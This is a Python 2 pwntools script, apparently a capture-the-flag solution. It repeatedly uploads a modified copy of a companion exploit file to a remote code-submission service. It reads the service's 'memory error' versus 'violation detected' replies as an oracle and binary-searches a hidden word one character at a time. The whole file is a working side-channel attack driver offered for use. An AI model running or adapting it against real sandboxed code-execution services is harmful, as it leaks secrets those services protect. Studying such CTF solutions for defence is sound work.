#coding: utf-8
MEM_ERROR = 'Error: Memory error occurred!'
VIOLATION = 'Violation detected'

from pwn import *
import threading
from termcolor import colored
import signal
import os
import sys

Code = open("trendingtopic_exploit.py", 'r').read()

host = sys.argv[1]
port = int(sys.argv[2])

def test(m, code):
	r = remote(host, port, timeout=3)
	print(": Test "+chr(m))
	r.recvuntil('Please upload your source code')
	X_VALUE = chr(m)
	mCode = code[:code.index('X_VALUE=\'a\'')] \
		+('X_VALUE=\'%s\'' % X_VALUE)+code[code.index('X_VALUE=\'a\'') \
		+len('X_VALUE=\'a\''):]
	r.sendline(mCode)
	ret=r.recvall()
	#print ret
	if (MEM_ERROR in ret):
		return True
	elif (VIOLATION in ret):
		return False
	else:
		print colored("Error: "+ret, "red")
	return None
	
	

def lower_bound(lo, hi, code):
	while (lo < hi):
		m = (lo + hi)/2;
		ret = test(m, code)
		if ret == None: return None
		if (ret):
			hi = m;
		else:
			lo = m+1;
	if (lo == hi and test(lo, code)):
		print colored("Found"+": "+chr(lo), "green");
		return chr(lo)
	else:
		print colored("Some error", "red")
		return None

def searchWord():
	word = ''
	X_I = 0
	while True:
		code = Code[:Code.index('X_I=1')] \
			+('X_I=%d' % X_I)+Code[Code.index('X_I=1') \
			+len('X_I=1'):]
		ret = lower_bound(ord('a'), ord('z'), code)
		if ret != None: word += ret
		else:
			print "Word: "+word
			return word
		X_I += 1

word = searchWord()
print 'need word: '+word
